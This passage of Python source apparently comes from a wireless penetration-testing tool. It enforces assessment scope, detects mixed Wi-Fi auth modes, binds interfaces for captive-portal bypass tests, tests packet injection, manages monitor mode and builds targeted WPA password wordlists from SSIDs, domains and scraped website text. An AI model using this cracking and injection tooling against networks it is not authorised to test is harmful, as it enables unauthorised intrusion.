        mode="w", suffix=suffix, delete=False, encoding="utf-8")
    return Path(tmp.name), tmp


def _is_project_wordlist(path) -> bool:
    """True when `path` lives under the active project wordlists/ dir.
    Cleanup helpers use this to skip evidence files — generated wordlists
    in the project dir are preserved, not deleted at end of run."""
    if _PROJECT_WORDLIST_DIR is None or not path:
        return False
    try:
        return Path(path).resolve().is_relative_to(_PROJECT_WORDLIST_DIR.resolve())
    except (AttributeError, ValueError, OSError):
        # is_relative_to is 3.9+; fall back if missing or path is malformed
        try:
            return str(Path(path).resolve()).startswith(
                str(_PROJECT_WORDLIST_DIR.resolve()) + os.sep)
        except Exception:
            return False


def _in_scope(ap: dict) -> bool:
    """Return True if the AP is within the configured assessment scope.
    An empty scope means all APs are in-scope (default behaviour).
    Scope acts as a hard whitelist — any non-listed BSSID or SSID is blocked."""
    if not _scope_bssids and not _scope_ssids:
        return True
    bssid = ap.get("bssid", "").upper()
    ssid  = ap.get("ssid",  "")
    bssid_ok = not _scope_bssids or bssid in _scope_bssids
    ssid_ok  = not _scope_ssids  or ssid  in _scope_ssids
    if not (bssid_ok and ssid_ok):
        log(f"  OUT OF SCOPE — skipping {ssid!r} [{bssid}]")
        return False
    return True


def _is_active_scope(ap: dict) -> bool:
    ssid = ap.get("ssid", "")
    mode = _scope_modes.get(ssid, _scope_default_mode)
    return mode == "active"


# ── Cross-AP auth-mode consistency detector ──────────────────────────────────
# Ordered weakest → strongest.  Index = security tier.  Equal indices mean
# "no real downgrade" (e.g. WPA2-EAP and WPA3-EAP-Transition both ~tier 5).
_AUTH_STRENGTH = (
    ("OPEN",                 0),
    ("WEP",                  1),
    ("WPA-PSK",              2),
    ("WPA-EAP",              2),
    ("WPA2-PSK",             3),
    ("WPA2/WPA3-TRANSITION", 4),   # legitimate mixed mode, not a downgrade
    ("WPA2-ENTERPRISE",      4),
    ("WPA2-EAP",             4),
    ("WPA3-SAE",             5),
    ("WPA3-ENTERPRISE",      5),
    ("WPA3-EAP",             5),
    ("IPSK-SUSPECTED",       3),   # ~WPA2-PSK strength
)
_AUTH_TIER = {a: t for a, t in _AUTH_STRENGTH}


def _auth_strength_tier(auth_type: str) -> int:
    """Map a classified auth type string to a numeric strength tier.
    Unknown strings map to tier -1 (unclassifiable, ignored by the
    inconsistency detector to avoid false-positive downgrades on noisy
    classifier output)."""
    if not auth_type:
        return -1
    key = auth_type.strip().upper().replace(" ", "")
    return _AUTH_TIER.get(key, -1)


def _detect_mixed_auth_per_ssid(aps: list) -> None:
    """Emit an AETHER-INFO-MIXED-AUTH finding when the same SSID is broadcast
    across multiple BSSIDs with materially different auth-mode strengths.
    Only fires on true downgrades (Δtier ≥ 1 between strongest and weakest
    AP for the same SSID) — not on benign WPA2/WPA3 transition deployments
    where tiers are intentionally close."""
    by_ssid: dict = {}
    for ap in aps:
        if not isinstance(ap, dict):
            continue
        ssid = (ap.get("ssid") or "").strip()
        if not ssid:
            continue
        by_ssid.setdefault(ssid, []).append(ap)

    for ssid, ap_list in by_ssid.items():
        # Need ≥2 APs broadcasting this SSID to have any spread
        if len(ap_list) < 2:
            continue
        tier_map: dict = {}
        for ap in ap_list:
            at = ap.get("auth_type") or ap.get("authentication") or ""
            tier = _auth_strength_tier(at)
            if tier < 0:
                continue   # unclassifiable — exclude from downgrade calc
            tier_map.setdefault(tier, []).append({
                "bssid":     ap.get("bssid", ""),
                "auth_type": at,
                "channel":   ap.get("channel", ""),
                "vendor":    ap.get("vendor", ""),
            })
        if len(tier_map) < 2:
            continue   # all APs at same tier (or unclassifiable) → no downgrade
        strongest = max(tier_map.keys())
        weakest   = min(tier_map.keys())
        if strongest - weakest < 1:
            continue   # tiers are adjacent at most — could be benign transition
        # True downgrade — strongest auth on some APs, weaker on others.
        # Emit ONE finding per SSID; affected[] lists every BSSID using
        # less-than-strongest auth so the operator knows which APs to
        # remediate.
        weak_aps = []
        for tier, bs in tier_map.items():
            if tier < strongest:
                weak_aps.extend(bs)
        finding_from_cat(
            "AETHER-INFO-MIXED-AUTH",
            data={
                "ssid":                ssid,
                "strongest_auth_tier": strongest,
                "weakest_auth_tier":   weakest,
                "tier_delta":          strongest - weakest,
                "downgraded_bssids":   weak_aps,
                "strongest_bssids": [
                    {"bssid": ap["bssid"], "auth_type": ap["auth_type"]}
                    for ap in tier_map[strongest]
                ],
            },
            title_override=(
                f"Inconsistent Auth Modes for SSID '{ssid}' — "
                f"{len(weak_aps)} AP(s) using weaker auth"
            ),
        )


# ── Wireless-interface binding helpers (captive portal tests) ────────────────
# Captive portal bypass tests MUST traverse the wireless interface under test
# — otherwise the OS routing table picks egress (often eth0 or a VPN tun0 on
# Pi appliances), producing false-positive "bypass succeeded" findings that
# reflect the operator's wired/VPN connection, not the wireless captive
# portal.  These helpers force every subprocess (dig, curl, ping) and every
# Python socket onto the specified interface.

def _get_iface_ip(iface: str, family: int = 4) -> "str | None":
    """Return the IPv4 (family=4) or IPv6 (family=6, non-link-local) address
    currently bound to `iface`, or None if none/iface missing.  Used to gate
    captive portal tests — no IP means the interface isn't associated and
    cannot carry IP traffic, so all bypass tests must be skipped."""
    if not iface:
        return None
    try:
        flag = "-4" if family == 4 else "-6"
        out, rc = _run(["ip", flag, "-o", "addr", "show", "dev", iface], timeout=5)
        if rc != 0 or not out:
            return None
        if family == 4:
            m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", out)
            return m.group(1) if m else None
        # IPv6 — exclude link-local (fe80::/10)
        for m in re.finditer(r"inet6 ([0-9a-fA-F:]+)", out):
            addr = m.group(1)
            if not addr.lower().startswith(("fe80:", "::1")):
                return addr
        return None
    except Exception:
        return None


def _curl_iface_args(iface: str) -> list:
    """Return curl args that bind to `iface`, or [] if iface is empty.
    Use as `cmd = ['curl', *_curl_iface_args(iface), '-sS', '-m', '5', url]`."""
    return ["--interface", iface] if iface else []


def _dig_iface_args(iface_ip: str) -> list:
    """Return dig args that bind queries to source IP `iface_ip`, or [] if
    empty.  Use as `cmd = ['dig', *_dig_iface_args(ip), '@resolver', name]`."""
    return ["-b", iface_ip] if iface_ip else []


def _ping_iface_args(iface: str) -> list:
    """Return ping args that bind to `iface`, or [] if empty."""
    return ["-I", iface] if iface else []


def _get_default_gateway(iface: str) -> str:
    try:
        out, rc = _run(["ip", "route", "show", "dev", iface, "default"], timeout=5)
        if rc == 0 and out.strip():
            parts = out.strip().split()
            if "via" in parts:
                return parts[parts.index("via") + 1]
    except Exception:
        pass
    return ""


def _bind_socket_to_iface(sock, iface: str) -> bool:
    """Bind a socket to a specific interface via SO_BINDTODEVICE (Linux).
    Returns True on success.  Requires root.  Falls back to IP-based bind
    when SO_BINDTODEVICE is unavailable (macOS dev box, missing CAP_NET_RAW)."""
    if not iface:
        return False
    try:
        import socket as _s
        sock.setsockopt(_s.SOL_SOCKET, 25, iface.encode() + b"\0")
        return True
    except (OSError, AttributeError):
        ip = _get_iface_ip(iface)
        if not ip:
            return False
        try:
            sock.bind((ip, 0))
            return True
        except OSError:
            return False


# ── Privilege / pre-flight checks ─────────────────────────────────────────────

def _check_privileges() -> None:
    if os.geteuid() == 0:
        return
    _, rc = _run(["sudo", "-n", "true"], timeout=5)
    if rc != 0:
        err("WARNING: not running as root and passwordless sudo is unavailable. "
            "Wireless operations will fail. Run as root or configure NOPASSWD sudo.")


def _check_interface(interface: str) -> bool:
    sys_net = Path("/sys/class/net")
    if sys_net.exists():
        if (sys_net / interface).exists():
            return True
        available = ", ".join(sorted(p.name for p in sys_net.iterdir()))
        err(f"Interface '{interface}' not found. Available: {available}")
        return False
    _, rc = _run(["ifconfig", interface], timeout=5)
    if rc != 0:
        err(f"Interface '{interface}' not found (ifconfig rc={rc}).")
        return False
    return True


def _check_injection(monitor_iface: str) -> bool:
    """Test packet injection capability using aireplay-ng --test (-9).
    Returns True if injection is confirmed, False if it fails.
    A failed test is a warning, not a hard abort — some tools manage their
    own injection without relying on this test."""
    if not shutil.which("aireplay-ng"):
        log("[~] aireplay-ng not found — skipping injection test")
        return True
    log(f"Testing packet injection on {monitor_iface}...")
    out, rc = _run(["sudo", "aireplay-ng", "-9", monitor_iface], timeout=30)
    if "Injection is working!" in out or rc == 0:
        log(f"  Injection OK on {monitor_iface}")
        return True
    err(f"  Injection test failed on {monitor_iface}. "
        f"Deauthentication and ARP replay attacks may not work.\n{out[:300]}")
    return False


# ── Wordlist helpers ──────────────────────────────────────────────────────────

def _generate_ssid_wordlist(ssid: str, base_wordlist: str | None) -> str | None:
    """Generate a targeted wordlist seeded from the SSID name with common
    password mutations (year suffixes, numeric suffixes, case variants).
    Merges with base_wordlist when provided.
    Returns path to the generated temp file, or None on failure."""
    if not ssid:
        return base_wordlist

    mutations: list[str] = []
    candidates = [ssid, ssid.lower(), ssid.upper(), ssid.capitalize()]
    suffixes   = (
        [""] +
        [str(y) for y in range(2019, 2027)] +       # year variants
        ["!", "@", "#", "123", "1234", "12345",
         "0", "01", "001", "wifi", "pass", "admin"]
    )
    for base in candidates:
        for sfx in suffixes:
            w = base + sfx
            if 8 <= len(w) <= 63:   # WPA passphrase length bounds
                mutations.append(w)
        # Reversed
        rev = base[::-1]
        if 8 <= len(rev) <= 63:
            mutations.append(rev)

    seen: set[str] = set()
    deduped = [w for w in mutations if not (w in seen or seen.add(w))]  # type: ignore[func-returns-value]

    try:
        path, fh = _open_wordlist_file(f"ssid_{_sanitize_wordlist_name(ssid)}")
        # SSID-derived mutations first (highest probability)
        for w in deduped:
            fh.write(w + "\n")
        # Append base wordlist lines
        if base_wordlist and os.path.exists(base_wordlist):
            with open(base_wordlist, encoding="utf-8", errors="replace") as f:
                for line in f:
                    line = line.rstrip("\n")
                    if 8 <= len(line) <= 63 and line not in seen:
                        fh.write(line + "\n")
        fh.close()
        log(f"  SSID wordlist: {len(deduped)} mutations + base → {path}")
        return str(path)
    except Exception as exc:
        err(f"SSID wordlist generation failed: {exc}")
        return base_wordlist


def _concat_wordlists(wordlists: list[str]) -> str | None:
    """Concatenate multiple base wordlists into a single deduplicated temp file.

    Filters to WPA passphrase length bounds (8-63 chars) per entry and preserves
    the order of input lists (so operator-prioritised lists like Crucible's
    probable-v2-wpa-top4800.txt land before rockyou.txt). Returns the temp file
    path, or None if no input files exist or are non-empty.
    """
    existing = [w for w in (wordlists or []) if w and os.path.exists(w)]
    if not existing:
        return None
    if len(existing) == 1:
        return existing[0]
    try:
        seen: set = set()
        count = 0
        path, fh = _open_wordlist_file("merged_base", suffix=".txt")
        for wl_path in existing:
            try:
                with open(wl_path, encoding="utf-8", errors="replace") as f:
                    for line in f:
                        line = line.rstrip("\n").rstrip("\r")
                        if 8 <= len(line) <= 63 and line not in seen:
                            seen.add(line)
                            fh.write(line + "\n")
                            count += 1
            except Exception as exc:
                err(f"  [merge] Failed to read {wl_path}: {exc}")
        fh.close()
        log(f"  Merged {len(existing)} wordlists → {count} unique entries → {path}")
        return str(path)
    except Exception as exc:
        err(f"Wordlist merge failed: {exc}")
        return existing[0] if existing else None


def _build_domain_wordlist(domains: list[str], base_wordlist: str | None) -> str | None:
    """Build a targeted wordlist from provided domain names.

    Parsing  — strips TLDs/ccTLDs, splits on '.', '-', '_', and numeric
               boundaries to extract meaningful word components.
    Mutations— per-word: lowercase, UPPERCASE, Capitalize, CamelCase, l33t.
    Combos   — pairs of component words joined with common separators and
               year/symbol suffixes.
    Perms    — all orderings of the word set (capped at 4 words).
    All candidates are deduplicated and filtered to WPA passphrase length
    bounds (8–63 chars).  Returns path to a temp file, or base_wordlist when
    no domains are supplied.
    """
    if not domains:
        return base_wordlist

    _STRIP_SUFFIXES = {
        "com", "net", "org", "edu", "gov", "mil", "int", "co", "io", "ai",
        "info", "biz", "us", "uk", "ca", "au", "de", "fr", "jp", "cn",
        "tech", "app", "dev", "cloud", "online", "site", "web", "store",
        "shop", "blog", "news", "mail", "email",
    }

    raw_words: list[str] = []
    for domain in domains:
        domain = re.sub(r'^https?://', '', domain)
        labels = domain.lower().split('.')
        filtered = [lb for lb in labels if lb and lb not in _STRIP_SUFFIXES]
        for label in filtered:
            for part in re.split(r'[-_]', label):
                for sp in re.split(r'(\d+)', part):
                    if sp:
                        raw_words.append(sp)

    if not raw_words:
        return base_wordlist

    # Deduplicate component words preserving order
    seen_w: set[str] = set()
    unique_words: list[str] = []
    for w in raw_words:
        wl = w.lower()
        if wl and wl not in seen_w:
            seen_w.add(wl)
            unique_words.append(wl)

    def _mutations(word: str) -> list[str]:
        cap   = word[0].upper() + word[1:] if len(word) > 1 else word.upper()
        l33t  = (word.replace('a', '@').replace('e', '3')
                     .replace('i', '1').replace('o', '0').replace('s', '$'))
        variants = [word, word.lower(), word.upper(), word.capitalize(),
                    cap, l33t]
        # camelCase with next word handled at combination step; single-word
        # title is same as capitalize — skip duplicate
        return list(dict.fromkeys(v for v in variants if v))

    _sfx = (
        [""] +
        [str(y) for y in range(2019, 2027)] +
        ["!", "@", "#", "1", "12", "123", "1234", "12345",
         "0", "01", "001", "pass", "wifi", "admin", "key",
         "vpn", "wlan", "net", "2.4", "5g", "5ghz"]
    )
    _seps = ["", "-", "_", ".", "@", "!", "1", "123"]

    seen: set[str] = set()
    candidates: list[str] = []

    def _add(w: str) -> None:
        if w and w not in seen and 8 <= len(w) <= 63:
            seen.add(w)
            candidates.append(w)

    # Single-word mutations + suffixes
    for base in unique_words:
        for mut in _mutations(base):
            for sfx in _sfx:
                _add(mut + sfx)
                if sfx:
                    _add(sfx + mut)

    # Pairwise combinations (cap at 8 unique words to avoid explosion)
    capped = unique_words[:8]
    if len(capped) >= 2:
        for i, w1 in enumerate(capped):
            for w2 in capped:
                if w1 == w2:
                    continue
                for m1 in _mutations(w1)[:3]:
                    for m2 in _mutations(w2)[:3]:
                        for sep in _seps:
                            _add(m1 + sep + m2)
                            for sfx in ["", "!", "1", "123"]:
                                _add(m1 + sep + m2 + sfx)

    # Permutations of up to 4 words (up to 4! = 24 orderings)
    perm_src = capped[:4]
    if len(perm_src) >= 2:
        for r in range(2, len(perm_src) + 1):
            for perm in _permutations(perm_src, r):
                joined = "".join(perm)
                _add(joined)
                for sep in ["-", "_", "."]:
                    _add(sep.join(perm))
                for sfx in ["", "!", "1", "123"]:
                    _add(joined + sfx)

    try:
        first_domain = domains[0] if domains else "unnamed"
        path, fh = _open_wordlist_file(f"domain_{_sanitize_wordlist_name(first_domain)}")
        for w in candidates:
            fh.write(w + "\n")
        if base_wordlist and os.path.exists(base_wordlist):
            with open(base_wordlist, encoding="utf-8", errors="replace") as f:
                for line in f:
                    line = line.rstrip("\n")
                    if 8 <= len(line) <= 63 and line not in seen:
                        seen.add(line)
                        fh.write(line + "\n")
        fh.close()
        log(f"  Domain wordlist: {len(candidates)} entries from "
            f"{len(domains)} domain(s) → {path}")
        return str(path)
    except Exception as exc:
        err(f"Domain wordlist generation failed: {exc}")
        return base_wordlist


# ── Website wordlist builder ──────────────────────────────────────────────────

_STOP_WORDS: frozenset = frozenset({
    "a", "an", "the", "and", "or", "but", "if", "in", "on", "at", "to",
    "for", "of", "with", "by", "from", "up", "about", "into", "through",
    "is", "are", "was", "were", "be", "been", "being", "have", "has", "had",
    "do", "does", "did", "will", "would", "could", "should", "may", "might",
    "can", "this", "that", "these", "those", "it", "its", "we", "you", "he",
    "she", "they", "them", "their", "our", "your", "my", "his", "her", "all",
    "as", "so", "no", "not", "also", "than", "then", "when", "where", "who",
    "which", "what", "how", "why", "more", "most", "some", "any", "each",
    "both", "few", "other", "such", "very", "just", "new", "one", "two",
    "three", "four", "five", "six", "seven", "eight", "nine", "ten",
    "get", "got", "use", "used", "using", "see", "make", "made", "go",
    "come", "back", "first", "last", "only", "same", "good", "much",
    "i", "me", "us", "www", "http", "https", "html", "css", "php",
})

_MONTH_ABBRV = ("", "Jan", "Feb", "Mar", "Apr", "May", "Jun",
                "Jul", "Aug", "Sep", "Oct", "Nov", "Dec")
_MONTH_NAMES = ("", "January", "February", "March", "April", "May", "June",
                "July", "August", "September", "October", "November", "December")
_MONTH_MAP = {
    "january":1,  "jan":1,  "february":2, "feb":2,  "march":3,   "mar":3,
    "april":4,    "apr":4,  "may":5,       "june":6, "jun":6,     "july":7,
    "jul":7,      "august":8,"aug":8,      "september":9, "sep":9, "sept":9,
    "october":10, "oct":10, "november":11, "nov":11, "december":12,"dec":12,
}


def _expand_date(year: int, month: int, day: int) -> set:
    """Return a set of password-style strings representing a calendar date."""
    yy   = f"{year % 100:02d}"
    yyyy = f"{year:04d}"
    mm   = f"{month:02d}"
    dd   = f"{day:02d}"
    mn   = _MONTH_ABBRV[month]
    mf   = _MONTH_NAMES[month]
    return {
        f"{dd}{mm}{yy}", f"{dd}{mm}{yyyy}",
        f"{mm}{dd}{yy}", f"{mm}{dd}{yyyy}",
        f"{yyyy}{mm}{dd}", f"{yy}{mm}{dd}",
        f"{dd}-{mm}-{yy}", f"{dd}/{mm}/{yyyy}",
        f"{mm}-{dd}-{yy}", f"{mm}/{dd}/{yyyy}",
        f"{yyyy}-{mm}-{dd}",
        f"{mn}{dd}", f"{mn}{yy}", f"{mn}{yyyy}",
        f"{mn}{dd}{yy}", f"{mn}{dd}{yyyy}",
        f"{dd}{mn}", f"{dd}{mn}{yy}", f"{dd}{mn}{yyyy}",
        f"{mf}{dd}", f"{mf}{yyyy}", f"{mf}{dd}{yyyy}",
        yyyy, yy, dd, mm,
    }


def _detect_dates(text: str) -> list:
    """Find date patterns in text; return list of (year, month, day) tuples."""
    results = []
    # ISO: 2026-05-19 or 2026/05/19
    for m in re.finditer(r'\b((?:19|20)\d{2})[-/](\d{1,2})[-/](\d{1,2})\b', text):
        try:
            y, mo, d = int(m.group(1)), int(m.group(2)), int(m.group(3))
            if 1 <= mo <= 12 and 1 <= d <= 31:
                results.append((y, mo, d))
        except ValueError:
            pass
    # US short: 05/19/2026 or 5-19-26
    for m in re.finditer(r'\b(\d{1,2})[-/](\d{1,2})[-/]((?:19|20)?\d{2})\b', text):
        try:
            mo, d, y = int(m.group(1)), int(m.group(2)), int(m.group(3))
            if y < 100:
                y += 2000
            if 1 <= mo <= 12 and 1 <= d <= 31 and 1900 <= y <= 2050:
                results.append((y, mo, d))
        except ValueError:
            pass
    # Written: "May 19, 2026" or "19 May 2026"
    _mp = (r'(?:Jan(?:uary)?|Feb(?:ruary)?|Mar(?:ch)?|Apr(?:il)?|May|Jun(?:e)?'
           r'|Jul(?:y)?|Aug(?:ust)?|Sep(?:tember)?|Oct(?:ober)?|Nov(?:ember)?|Dec(?:ember)?)')
    for m in re.finditer(rf'\b({_mp})\s+(\d{{1,2}})(?:st|nd|rd|th)?,?\s+((?:19|20)\d{{2}})\b',
                         text, re.IGNORECASE):
        mo = _MONTH_MAP.get(m.group(1).lower()[:3])
        if mo:
            try:
                results.append((int(m.group(3)), mo, int(m.group(2))))
            except ValueError:
                pass
    for m in re.finditer(rf'\b(\d{{1,2}})(?:st|nd|rd|th)?\s+({_mp})\s+((?:19|20)\d{{2}})\b',
                         text, re.IGNORECASE):
        mo = _MONTH_MAP.get(m.group(2).lower()[:3])
        if mo:
            try:
                results.append((int(m.group(3)), mo, int(m.group(1))))
            except ValueError:
                pass
    return list({(y, mo, d) for y, mo, d in results if 1900 <= y <= 2050})


class _TextLinkParser(_HTMLParser):
    """Single-pass HTML parser that extracts visible text and same-domain hrefs."""
    _SKIP_TAGS: frozenset = frozenset({
        "script", "style", "noscript", "svg", "path", "head",
        "code", "pre", "iframe", "object", "embed",
    })

    def __init__(self, base_url: str) -> None:
        super().__init__(convert_charrefs=True)
        self._skip: int = 0
        self._base = base_url
        self._base_parsed = urllib.parse.urlparse(base_url)
        self.texts: list = []
        self.links: set = set()

    def handle_starttag(self, tag: str, attrs) -> None:
        if tag in self._SKIP_TAGS:
            self._skip += 1
        amap = dict(attrs)
        for attr in ("alt", "title", "placeholder", "aria-label"):
            if amap.get(attr):
                self.texts.append(amap[attr])
        href = amap.get("href", "")
        if href and not href.startswith(("#", "javascript:", "mailto:", "tel:")):
            abs_url = urllib.parse.urljoin(self._base, href)
            p = urllib.parse.urlparse(abs_url)
            if (p.netloc == self._base_parsed.netloc
                    and p.scheme in ("http", "https")):
                self.links.add(urllib.parse.urlunparse(
                    (p.scheme, p.netloc, p.path, "", "", "")))

    def handle_endtag(self, tag: str) -> None:
        if tag in self._SKIP_TAGS:
            self._skip = max(0, self._skip - 1)

    def handle_data(self, data: str) -> None:
        if self._skip == 0 and data.strip():
            self.texts.append(data)


def _scrape_site(url: str, max_depth: int, max_pages: int = 80) -> tuple:
    """Crawl url up to max_depth levels within the same domain.
    Returns (word_set: set[str], dates: list[tuple]).
    """
    visited: set = set()
    queue: list = [(url.rstrip("/"), 0)]
    all_texts: list = []

    while queue and len(visited) < max_pages:
        cur, depth = queue.pop(0)
        if cur in visited:
            continue
        visited.add(cur)
        log(f"  [scrape] {cur} (depth {depth})")
        try:
            req = urllib.request.Request(
                cur,
                headers={"User-Agent": "pr0t31n-wordlist/1.0 (+assessment)"},
            )
            with urllib.request.urlopen(req, timeout=12) as resp:
                ct = resp.headers.get("Content-Type", "")
                if "text/html" not in ct:
                    continue
                body = resp.read(1_500_000).decode("utf-8", errors="replace")
        except Exception as exc:
            err(f"  [scrape] {cur}: {exc}")
            continue

        parser = _TextLinkParser(cur)
        try:
            parser.feed(body)
        except Exception:
            pass
        all_texts.extend(parser.texts)

        if depth < max_depth:
            for link in parser.links:
                if link not in visited:
                    queue.append((link, depth + 1))

    log(f"  [scrape] Crawled {len(visited)} page(s)")
    joined = " ".join(all_texts)

    # Track frequency, not just presence — the combinator uses it to
    # prioritise repeated terms (brand / product / leadership names) over
    # one-off filler words.  Replaces the prior set-based extraction.
    word_counts: "Counter[str]" = Counter()
    for raw in re.findall(r"[a-zA-Z][a-zA-Z0-9]{2,}", joined):
        w = raw.lower()
        if len(w) >= 3 and w not in _STOP_WORDS:
            word_counts[w] += 1

    dates = _detect_dates(joined)
    return word_counts, dates


def _build_website_wordlist(url: str, max_depth: int,
                             base_wordlist: str | None) -> str | None:
    """Crawl a website and build a password-candidate wordlist from its content.

    Words are extracted from all visible text, filtered for stop words,
    then expanded via case mutations, date representations, pairwise
    combinations (sep variants), and 3-word permutations.  The result is
    written to a temp file that extends base_wordlist.
    """
    if not url:
        return base_wordlist

    log(f"Website wordlist: scraping {url} (max depth {max_depth})…")
    try:
        word_counts, dates = _scrape_site(url, max(1, min(7, max_depth)))
    except Exception as exc:
        err(f"Website scrape error: {exc}")
        return base_wordlist

    if not word_counts:
        log("  [scrape] No usable words extracted")
        return base_wordlist

    log(f"  [scrape] {len(word_counts)} unique words, {len(dates)} date(s)")

    seen: set = set()
    candidates: list = []

    def _add(w: str) -> None:
        if w and w not in seen and 8 <= len(w) <= 63:
            seen.add(w)
            candidates.append(w)

    # Rank words by frequency × √length so the combinator's caps select
    # the most-mentioned and most-distinctive terms (brand/product names,
    # leadership surnames, geography) instead of whatever happens to be
    # alphabetically first.  √length damps the length effect so a 30-char
    # chemistry term doesn't outrank an 8-char product name mentioned 50×.
    # Tie-break by raw frequency then length so the order is deterministic.
    def _score(w: str) -> tuple:
        return (word_counts[w] * math.sqrt(len(w)),
                word_counts[w], len(w), w)
    word_list = sorted(word_counts.keys(), key=_score, reverse=True)

    # Single-word mutations — every scraped word, all three case forms
    for w in word_list:
        for v in (w, w.capitalize(), w.upper()):
            _add(v)

    # Date expansions
    date_strs: set = set()
    for (y, mo, d) in dates:
        date_strs.update(_expand_date(y, mo, d))
    for ds in date_strs:
        _add(ds)
        for sfx in ("!", "@", "1", "123"):
            _add(ds + sfx)

    # Words + dates — cap raised 40 → 100 (top-scored words only)
    for w in word_list[:100]:
        for ds in list(date_strs)[:25]:
            _add(w + ds)
            _add(w.capitalize() + ds)
            _add(ds + w)

    # Pairwise permutations — cap raised 50 → 100, with itertools.permutations
    # so all orderings are generated (a-b AND b-a) instead of relying on a
    # reverse-add inside an alphabetic-comparison filter.  Old code also had
    # an early break at i=29 that capped the outer loop further; removed.
    cap2 = word_list[:100]
    seps = ("", "-", "_", ".")
    for w1, w2 in _permutations(cap2, 2):
        for sep in seps:
            _add(w1 + sep + w2)
            _add(w1.capitalize() + sep + w2.capitalize())

    # 3-word permutations — cap raised 20 → 30, true permutations (was
    # combinations gated by `if j <= i: continue`).  At cap 30 this yields
    # 30×29×28 = 24,360 ordered triples × 3 case/sep variants = ~73K entries.
    cap3 = word_list[:30]
    for w1, w2, w3 in _permutations(cap3, 3):
        _add(w1 + w2 + w3)
        _add(w1.capitalize() + w2.capitalize() + w3.capitalize())
        _add(w1 + "-" + w2 + "-" + w3)

    log(f"  Website wordlist: {len(candidates)} candidate passwords")

    try:
        try:
            _host = urllib.parse.urlparse(url).hostname or "site"
        except Exception:
            _host = "site"
        path, fh = _open_wordlist_file(
            f"website_{_sanitize_wordlist_name(_host)}", suffix=".txt")
        for w in candidates:
            fh.write(w + "\n")
        if base_wordlist and os.path.exists(base_wordlist):
            with open(base_wordlist, encoding="utf-8", errors="replace") as bf:
                for line in bf:
                    line = line.rstrip("\n")
                    if 8 <= len(line) <= 63 and line not in seen:
                        seen.add(line)
                        fh.write(line + "\n")
        fh.close()
        log(f"  Website wordlist saved → {path}")
        return str(path)
    except Exception as exc:
        err(f"Website wordlist write failed: {exc}")
        return base_wordlist


# ── Monitor mode management ───────────────────────────────────────────────────

# Known-fragile USB WiFi drivers that benefit from a modprobe -r/modprobe
# cycle after monitor-mode use.  These chipsets leak firmware state that
# later operations (NM scans, MAC rotations, channel hops) can wedge on.
# Built-in/PCIe radios are not affected and are skipped automatically.
_USB_FRAGILE_DRIVERS = {
    "mt76x2u", "mt76x0u", "mt76", "mt7601u",
    "rtl8812au", "rtl88xxau", "rtl8814au", "8821au", "rtl8xxxu",
}


def _nm_set_unmanaged(interface: str, unmanaged: bool) -> None:
    """Toggle NetworkManager's per-device management for `interface`.
    Replaces 'airmon-ng check kill' — surgical instead of nuclear.  Other
    interfaces (eth0, bridges, OpenVPN, ZeroTier) keep their NM management.
    Session-scoped; does not persist across NM restarts (which is exactly
    what we want for a session-bounded exclusion).  Silent no-op on systems
    without nmcli."""
    if not shutil.which("nmcli"):
        return
    state = "no" if unmanaged else "yes"
    _run(["sudo", "nmcli", "device", "set", interface, "managed", state],
         timeout=5)


def _wpa_supplicant_release(interface: str) -> None:
    """Politely ask wpa_supplicant to release its hold on `interface`.
    Soft equivalent to killing wpa_supplicant for one iface — leaves the
    daemon alive for other interfaces.  Silent no-op without wpa_cli."""
    if not shutil.which("wpa_cli"):
        return
    _run(["sudo", "wpa_cli", "-i", interface, "terminate"],
         timeout=5)


def _detect_iface_driver(interface: str) -> str:
    """Return the kernel module name backing `interface`, or '' if unknown."""
    p = Path("/sys/class/net") / interface / "device/driver/module"
    try:
        return p.resolve().name
    except (OSError, FileNotFoundError):
        return ""


def _reset_usb_wifi_driver(interface: str) -> None:
    """Unload and reload the USB-WiFi driver for `interface` to clear
    post-monitor-mode chip-firmware state.  Only runs for drivers in
    _USB_FRAGILE_DRIVERS; built-in radios are skipped."""
    drv = _detect_iface_driver(interface)
    if not drv or drv not in _USB_FRAGILE_DRIVERS:
        return
    log(f"Resetting USB WiFi driver '{drv}' to clear post-monitor-mode state...")
    _run(["sudo", "modprobe", "-r", drv], timeout=15)
    time.sleep(2)
    _run(["sudo", "modprobe", drv], timeout=15)
    # udev + NM need a moment to re-detect the interface
    time.sleep(3)


def _verify_radio_health(interface: str, timeout: int = 10) -> tuple[bool, str]:
    """Probe the radio to confirm it's responsive.  Returns (ok, reason).

    Three checks, in order:
      1. Interface exists in /sys/class/net
      2. 'iw dev <iface> info' completes within timeout
      3. A short passive scan completes (driver is processing requests)

    Used at session start (fail fast on wedged radio) and end (catch
    teardown leaving a half-broken state)."""
    sys_net = Path("/sys/class/net") / interface
    if not sys_net.exists():
        return False, f"Interface {interface} not present"
    if not shutil.which("iw"):
        return True, "iw not available — skipping driver-level checks"
    try:
        rc = subprocess.run(
            ["sudo", "iw", "dev", interface, "info"],
            capture_output=True, timeout=timeout,
        )
        if rc.returncode != 0:
            return False, ("iw info failed: " +
                           rc.stderr.decode("utf-8", "replace")[:120])
    except subprocess.TimeoutExpired:
        return False, "iw info timed out — driver may be wedged"
    # Lightweight passive scan — driver hangs surface here
    try:
        rc = subprocess.run(
            ["sudo", "iw", "dev", interface, "scan", "passive"],
            capture_output=True, timeout=timeout,
        )
        # "Network is down" on a managed iface that's still link-down is OK
        if rc.returncode != 0 and b"Network is down" not in rc.stderr:
            return False, ("scan failed: " +
                           rc.stderr.decode("utf-8", "replace")[:120])
    except subprocess.TimeoutExpired:
        return False, "scan timed out — driver wedged"
    return True, "healthy"


def enable_monitor_mode(interface: str, monitor_iface: str) -> str:
    log(f"Enabling monitor mode on {interface}...")
    sys_net = Path("/sys/class/net")

    def _net_ifaces() -> set:
        return {p.name for p in sys_net.iterdir()} if sys_net.exists() else set()

    def _is_monitor(name: str) -> bool:
        try:
            return (sys_net / name / "type").read_text().strip() == "803"
        except Exception:
            return False

    if shutil.which("airmon-ng"):
        pre = _net_ifaces()
        # Surgical NM exclusion instead of `airmon-ng check kill`.  The legacy
        # `check kill` SIGKILLs wpa_supplicant and stops NetworkManager
        # globally — destructive on always-on appliances that rely on NM for
        # OpenVPN/bridge/ZeroTier management.  `nmcli device set <iface>
        # managed no` only tells NM to stop touching the attack radio; all
        # other interfaces stay managed.  Falls back to no-op on systems
        # without nmcli.
        _nm_set_unmanaged(interface, unmanaged=True)
        _wpa_supplicant_release(interface)
        out, _ = _run(["sudo", "airmon-ng", "start", interface])
        time.sleep(2)
        post = _net_ifaces()

        # Primary: newly-appeared interface confirmed in monitor mode via sysfs
